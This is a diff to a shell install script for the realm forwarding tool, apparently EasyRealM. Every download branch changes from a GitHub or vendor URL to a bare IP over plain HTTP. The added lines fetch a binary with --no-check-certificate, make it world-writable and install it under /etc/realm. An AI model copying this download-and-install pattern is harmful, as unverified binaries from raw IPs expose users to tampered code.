@@ -49,7 +49,7 @@ Install_RealM(){
   wget -N --no-check-certificate http://146.56.133.33:13333/realm1.5 && chmod 777 realm1.5 && mv realm1.5 /etc/realm/realm
   else
   mkdir /etc/realm
-  wget -N --no-check-certificate https://recordaily.com/soft/realm1.2.2 && chmod +x realm1.2.2 && mv realm1.2.2 /etc/realm/realm
+  wget -N --no-check-certificate http://146.56.133.33:13333/realm1.5 && chmod 777 realm1.5 && mv realm1.5 /etc/realm/realm
   fi  
   else
   echo -e "#############################################################"
@@ -60,10 +60,10 @@ Install_RealM(){
   [[ -z ${version} ]] && version="1"
   if [[ ${version} == [2] ]]; then  
   mkdir /etc/realm
-  wget -N --no-check-certificate https://github.com/seal0207/EasyRealM/raw/main/realm1.2.0 && chmod +x realm1.2.0 && mv realm1.2.0 /etc/realm/realm
+  wget -N --no-check-certificate http://146.56.133.33:13333/realm1.5 && chmod 777 realm1.5 && mv realm1.5 /etc/realm/realm
   else
   mkdir /etc/realm
-  wget -N --no-check-certificate https://raw.githubusercontent.com/seal0207/EasyRealM/main/realm1.4 && chmod +x realm1.4 && mv realm1.4 /etc/realm/realm  
+  wget -N --no-check-certificate http://146.56.133.33:13333/realm1.5 && chmod 777 realm1.5 && mv realm1.5 /etc/realm/realm
   fi
   fi
   
